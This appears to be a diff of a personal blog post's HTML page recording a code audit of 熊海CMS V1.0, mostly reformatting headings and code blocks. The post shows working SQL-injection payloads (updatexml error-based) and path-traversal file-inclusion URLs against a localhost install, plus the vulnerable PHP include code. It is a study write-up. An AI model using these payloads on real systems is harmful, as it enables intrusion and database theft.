@@ -20,15 +20,15 @@
 
 <script class="next-config" data-name="main" type="application/json">{"hostname":"liaorj.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.11.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
 
-    <meta name="description" content="熊海CMS V1.0审计vscode+phpsuty ##SQL注入http:&#x2F;&#x2F;127.0.0.1&#x2F;xhcms&#x2F;admin&#x2F;?r&#x3D;login 1user&#x3D;admin*&amp;password&#x3D;123456&amp;login&#x3D;yes  ##前台文件包含http:&#x2F;&#x2F;127.0.0.1&#x2F;xhcms&#x2F;index.php?r&#x3D;..&#x2F;..&#x2F;phpinfo$file&#x3D;addslashes($_">
+    <meta name="description" content="熊海CMS V1.0审计vscode+phpsuty SQL注入http:&#x2F;&#x2F;127.0.0.1&#x2F;xhcms&#x2F;admin&#x2F;?r&#x3D;login 1user&#x3D;admin*&amp;password&#x3D;123456&amp;login&#x3D;yes  前台文件包含http:&#x2F;&#x2F;127.0.0.1&#x2F;xhcms&#x2F;index.php?r&#x3D;..&#x2F;..&#x2F;phpinfo 123$file&#x3D;addslashes($_GET[&amp;">
 <meta property="og:type" content="article">
 <meta property="og:title" content="熊海CMS V1.0审计">
 <meta property="og:url" content="https://liaorj.github.io/2022/08/10/%E7%86%8A%E6%B5%B7CMS%E5%AE%A1%E8%AE%A1/index.html">
 <meta property="og:site_name" content="LiAoRJ的成长记录">
-<meta property="og:description" content="熊海CMS V1.0审计vscode+phpsuty ##SQL注入http:&#x2F;&#x2F;127.0.0.1&#x2F;xhcms&#x2F;admin&#x2F;?r&#x3D;login 1user&#x3D;admin*&amp;password&#x3D;123456&amp;login&#x3D;yes  ##前台文件包含http:&#x2F;&#x2F;127.0.0.1&#x2F;xhcms&#x2F;index.php?r&#x3D;..&#x2F;..&#x2F;phpinfo$file&#x3D;addslashes($_">
+<meta property="og:description" content="熊海CMS V1.0审计vscode+phpsuty SQL注入http:&#x2F;&#x2F;127.0.0.1&#x2F;xhcms&#x2F;admin&#x2F;?r&#x3D;login 1user&#x3D;admin*&amp;password&#x3D;123456&amp;login&#x3D;yes  前台文件包含http:&#x2F;&#x2F;127.0.0.1&#x2F;xhcms&#x2F;index.php?r&#x3D;..&#x2F;..&#x2F;phpinfo 123$file&#x3D;addslashes($_GET[&amp;">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2022-08-10T15:34:36.000Z">
-<meta property="article:modified_time" content="2022-08-12T03:54:20.771Z">
+<meta property="article:modified_time" content="2022-08-12T07:23:13.702Z">
 <meta property="article:author" content="LiAoRJ">
 <meta property="article:tag" content="代码审计">
 <meta name="twitter:card" content="summary">
@@ -117,7 +117,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%86%8A%E6%B5%B7CMS-V1-0%E5%AE%A1%E8%AE%A1"><span class="nav-text">熊海CMS V1.0审计</span></a></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%86%8A%E6%B5%B7CMS-V1-0%E5%AE%A1%E8%AE%A1"><span class="nav-text">熊海CMS V1.0审计</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#SQL%E6%B3%A8%E5%85%A5"><span class="nav-text">SQL注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E5%8F%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="nav-text">前台文件包含</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="nav-text">后台文件包含</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E5%8F%B0%E6%B3%A8%E5%85%A5"><span class="nav-text">前台注入</span></a></li></ol></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -223,7 +223,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2022-08-12 11:54:20" itemprop="dateModified" datetime="2022-08-12T11:54:20+08:00">2022-08-12</time>
+      <time title="修改时间：2022-08-12 15:23:13" itemprop="dateModified" datetime="2022-08-12T15:23:13+08:00">2022-08-12</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -246,16 +246,19 @@
     
     <div class="post-body" itemprop="articleBody">
         <h1 id="熊海CMS-V1-0审计"><a href="#熊海CMS-V1-0审计" class="headerlink" title="熊海CMS V1.0审计"></a>熊海CMS V1.0审计</h1><p>vscode+phpsuty</p>
-<p>##SQL注入<br><a target="_blank" rel="noopener" href="http://127.0.0.1/xhcms/admin/?r=login">http://127.0.0.1/xhcms/admin/?r=login</a></p>
+<h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><p><a target="_blank" rel="noopener" href="http://127.0.0.1/xhcms/admin/?r=login">http://127.0.0.1/xhcms/admin/?r=login</a></p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user=admin*&amp;password=<span class="number">123456</span>&amp;login=yes</span><br></pre></td></tr></table></figure>
 
-<p>##前台文件包含<br><a target="_blank" rel="noopener" href="http://127.0.0.1/xhcms/index.php?r=../../phpinfo">http://127.0.0.1/xhcms/index.php?r=../../phpinfo</a><br>$file&#x3D;addslashes($_GET[‘r’]); &#x2F;&#x2F;接收文件名<br>$action&#x3D;$file&#x3D;&#x3D;’’?’index’:$file; &#x2F;&#x2F;判断为空或者等于index<br>include(‘files&#x2F;‘.$action.’.php’); &#x2F;&#x2F;载入相应文件</p>
-<p>##后台文件包含<br><a target="_blank" rel="noopener" href="http://127.0.0.1/xhcms/admin/index.php?r=../../../phpinfo">http://127.0.0.1/xhcms/admin/index.php?r=../../../phpinfo</a><br>$file&#x3D;addslashes($_GET[‘r’]); &#x2F;&#x2F;接收文件名<br>$action&#x3D;$file&#x3D;&#x3D;’’?’index’:$file; &#x2F;&#x2F;判断为空或者等于index<br>include(‘files&#x2F;‘.$action.’.php’); &#x2F;&#x2F;载入相应文件</p>
-<p>##前台注入</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/xhcms/?r=content&amp;cid=1 or updatexml(1,concat(0x7e,(select(database())),0x7e),1)#</span></span><br><span class="line">http:<span class="comment">//127.0.0.1/xhcms/?r=software&amp;cid=1 or updatexml(1,concat(0x7e,(select(database())),0x7e),1)#</span></span><br></pre></td></tr></table></figure>
+<h2 id="前台文件包含"><a href="#前台文件包含" class="headerlink" title="前台文件包含"></a>前台文件包含</h2><p><a target="_blank" rel="noopener" href="http://127.0.0.1/xhcms/index.php?r=../../phpinfo">http://127.0.0.1/xhcms/index.php?r=../../phpinfo</a></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file</span>=<span class="title function_ invoke__">addslashes</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>]); <span class="comment">//接收文件名</span></span><br><span class="line"><span class="variable">$action</span>=<span class="variable">$file</span>==<span class="string">&#x27;&#x27;</span>?<span class="string">&#x27;index&#x27;</span>:<span class="variable">$file</span>; <span class="comment">//判断为空或者等于index</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;files/&#x27;</span>.<span class="variable">$action</span>.<span class="string">&#x27;.php&#x27;</span>); <span class="comment">//载入相应文件</span></span><br></pre></td></tr></table></figure>
 
-<p>addslashes 防SQL注入 转义单引号 ‘  &#39;<br>$query &#x3D; “UPDATE content SET hit &#x3D; hit+1 WHERE id&#x3D;$id”; &#x2F;&#x2F;这里没用到单引号闭合 所以存在SQL注入</p>
+<h2 id="后台文件包含"><a href="#后台文件包含" class="headerlink" title="后台文件包含"></a>后台文件包含</h2><p><a target="_blank" rel="noopener" href="http://127.0.0.1/xhcms/admin/index.php?r=../../../phpinfo">http://127.0.0.1/xhcms/admin/index.php?r=../../../phpinfo</a></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file</span>=<span class="title function_ invoke__">addslashes</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>]); <span class="comment">//接收文件名</span></span><br><span class="line"><span class="variable">$action</span>=<span class="variable">$file</span>==<span class="string">&#x27;&#x27;</span>?<span class="string">&#x27;index&#x27;</span>:<span class="variable">$file</span>; <span class="comment">//判断为空或者等于index</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;files/&#x27;</span>.<span class="variable">$action</span>.<span class="string">&#x27;.php&#x27;</span>); <span class="comment">//载入相应文件</span></span><br></pre></td></tr></table></figure>
 
+<h2 id="前台注入"><a href="#前台注入" class="headerlink" title="前台注入"></a>前台注入</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/xhcms/?r=content&amp;cid=1 or updatexml(1,concat(0x7e,(select(database())),0x7e),1)#</span></span><br><span class="line">http:<span class="comment">//127.0.0.1/xhcms/?r=software&amp;cid=1 or updatexml(1,concat(0x7e,(select(database())),0x7e),1)#</span></span><br></pre></td></tr></table></figure>
+
+<p>addslashes 防SQL注入 转义单引号 ‘  &#39;</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$query</span> = <span class="string">&quot;UPDATE content SET hit = hit+1 WHERE id=<span class="subst">$id</span>&quot;</span>; <span class="comment">//这里没用到单引号闭合 所以存在SQL注入</span></span><br></pre></td></tr></table></figure>
     </div>
 
     
@@ -276,8 +279,8 @@
                 </a>
             </div>
             <div class="post-nav-item">
-                <a href="/2022/08/11/KKCMS%20v1.32%E5%AE%A1%E8%AE%A1/" rel="next" title="Beescms V4.0审计">
-                  Beescms V4.0审计 <i class="fa fa-chevron-right"></i>
+                <a href="/2022/08/11/KKCMS%20v1.32%E5%AE%A1%E8%AE%A1/" rel="next" title="KKCMS v1.32审计">
+                  KKCMS v1.32审计 <i class="fa fa-chevron-right"></i>
                 </a>
             </div>
           </div>
